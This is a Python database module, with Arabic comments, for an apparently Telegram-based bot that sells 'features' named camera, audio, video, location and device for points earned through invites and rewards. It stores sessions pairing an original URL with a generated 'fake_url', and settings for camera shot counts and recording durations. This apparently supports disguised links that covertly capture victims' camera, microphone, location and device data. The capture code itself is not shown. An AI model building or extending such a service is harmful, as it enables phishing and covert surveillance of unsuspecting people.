# ============================================================
#  database.py - كل دوال قاعدة البيانات
# ============================================================
import sqlite3
import json
import secrets
from datetime import datetime
from config import DB_PATH

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            points INTEGER DEFAULT 0,
            total_points INTEGER DEFAULT 0,
            invite_code TEXT UNIQUE,
            invited_by INTEGER,
            joined_date TEXT,
            last_active TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            date TEXT,
            points_earned INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_attempts (
            user_id INTEGER,
            date TEXT,
            attempts INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            channel_name TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS features (
            feature_name TEXT PRIMARY KEY,
            is_enabled INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        chat_id INTEGER,
        features TEXT,
        original_url TEXT,
        fake_url TEXT,
        config TEXT,
        created TEXT
    )
''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_rewards (
            user_id INTEGER,
            date TEXT,
            last_claim TEXT,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS group_rewards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            admin_id INTEGER,
            points INTEGER,
            member_count INTEGER,
            used_count INTEGER DEFAULT 0,
            created TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reward_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT,
            user_id INTEGER,
            used_at TEXT
        )
    ''')
    
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value)
        VALUES 
            ('free_attempts', '3'),
            ('video_duration', '30'),
            ('audio_duration', '30'),
            ('camera_count', '3')
    ''')
    
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        cursor.execute('''
            INSERT OR IGNORE INTO features (feature_name, is_enabled)
            VALUES (?, 1)
        ''', (feature,))
    
    conn.commit()
    conn.close()

# ====== دوال المستخدمين ======
def get_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, last_name, invited_by=None):
    conn = get_db()
    cursor = conn.cursor()
    invite_code = secrets.token_urlsafe(6)
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, invite_code, invited_by, joined_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, last_name, invite_code, invited_by, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    if invited_by:
        add_points(invited_by, 1, 'invite')
        log_invite(invited_by, user_id)
    return True

def update_user_activity(user_id):
    conn = get_db()
    conn.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def add_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET points = points + ?, total_points = total_points + ? WHERE user_id = ?', (points, points, user_id))
    conn.commit()
    conn.close()
    log_action(user_id, 'add_points', f'{points} نقاط - {reason}')

def deduct_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    user = cursor.execute('SELECT points FROM users WHERE user_id = ?', (user_id,)).fetchone()
    if user and user['points'] >= points:
        cursor.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()
        log_action(user_id, 'deduct_points', f'{points} نقاط - {reason}')
        return True
    conn.close()
    return False

def log_action(user_id, action, details=''):
    conn = get_db()
    conn.execute('''
        INSERT INTO user_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_invite(inviter_id, invited_id):
    conn = get_db()
    conn.execute('''
        INSERT INTO invites (inviter_id, invited_id, date, points_earned)
        VALUES (?, ?, ?, ?)
    ''', (inviter_id, invited_id, datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()

def get_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('SELECT attempts FROM daily_attempts WHERE user_id = ? AND date = ?', (user_id, today)).fetchone()
    conn.close()
    return result['attempts'] if result else 0

def increment_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO daily_attempts (user_id, date, attempts)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id, date) DO UPDATE SET attempts = attempts + 1
    ''', (user_id, today))
    conn.commit()
    conn.close()

def get_free_attempts_limit():
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = "free_attempts"').fetchone()
    conn.close()
    return int(result['value']) if result else 3

# ====== دوال القنوات الإجبارية ======
def get_required_channels():
    conn = get_db()
    channels = conn.execute('SELECT * FROM required_channels WHERE is_active = 1').fetchall()
    conn.close()
    return channels

def add_required_channel(channel_id, channel_name):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO required_channels (channel_id, channel_name, is_active)
        VALUES (?, ?, 1)
    ''', (channel_id, channel_name))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    conn = get_db()
    conn.execute('DELETE FROM required_channels WHERE channel_id = ?', (channel_id,))
    conn.commit()
    conn.close()

def is_feature_enabled(feature_name):
    conn = get_db()
    result = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    conn.close()
    return bool(result['is_enabled']) if result else True

def toggle_feature(feature_name):
    conn = get_db()
    current = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    if current:
        new_value = 0 if current['is_enabled'] else 1
        conn.execute('UPDATE features SET is_enabled = ? WHERE feature_name = ?', (new_value, feature_name))
        conn.commit()
        conn.close()
        return bool(new_value)
    conn.close()
    return False

def get_setting(key, default=None):
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
    conn.close()
    return result['value'] if result else default

def set_setting(key, value):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (key, value))
    conn.commit()
    conn.close()

# ====== دوال الأسعار ======
def get_prices():
    conn = get_db()
    prices = {}
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        result = conn.execute('SELECT value FROM settings WHERE key = ?', (f'price_{feature}',)).fetchone()
        prices[feature] = int(result['value']) if result else 5
    conn.close()
    return prices

def set_price(feature, price):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (f'price_{feature}', str(price)))
    conn.commit()
    conn.close()

# ====== دوال الجلسات ======
def generate_session_id():
    return secrets.token_urlsafe(12)

def create_session(chat_id, features, original_url, config_data=None):
    from utils import create_short_link
    session_id = generate_session_id()
    fake_url = create_short_link(session_id, original_url)
    
    conn = get_db()
    conn.execute('''
        INSERT INTO sessions (session_id, chat_id, features, original_url, fake_url, config, created)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (session_id, chat_id, features, original_url, fake_url, json.dumps(config_data or {}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return session_id

def get_session(session_id):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
    conn.close()
    return session

# ====== دوال النقاط اليومية والمكافآت الجماعية ======
def get_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('''
        SELECT last_claim FROM daily_rewards 
        WHERE user_id = ? AND date = ?
    ''', (user_id, today)).fetchone()
    conn.close()
    return result is None

def claim_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO daily_rewards (user_id, date, last_claim)
        VALUES (?, ?, ?)
    ''', (user_id, today, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_daily_reward_count():
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM daily_rewards WHERE date = ?', (today,)).fetchone()[0]
    conn.close()
    return count

def create_group_reward(admin_id, points, member_count, code):
    conn = get_db()
    conn.execute('''
        INSERT INTO group_rewards (code, admin_id, points, member_count, used_count, created)
        VALUES (?, ?, ?, ?, 0, ?)
    ''', (code, admin_id, points, member_count, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_group_reward(code):
    conn = get_db()
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    conn.close()
    return reward

def use_group_reward(code, user_id):
    conn = get_db()
    used = conn.execute('''
        SELECT * FROM reward_usage WHERE code = ? AND user_id = ?
    ''', (code, user_id)).fetchone()
    if used:
        conn.close()
        return False, 'already_used'
    
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    if not reward:
        conn.close()
        return False, 'not_found'
    
    if reward['used_count'] >= reward['member_count']:
        conn.close()
        return False, 'full'
    
    conn.execute('''
        UPDATE group_rewards SET used_count = used_count + 1 WHERE code = ?
    ''', (code,))
    conn.execute('''
        INSERT INTO reward_usage (code, user_id, used_at)
        VALUES (?, ?, ?)
    ''', (code, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    add_points(user_id, reward['points'], f'مكافأة جماعية: {code}')
    return True, reward['points']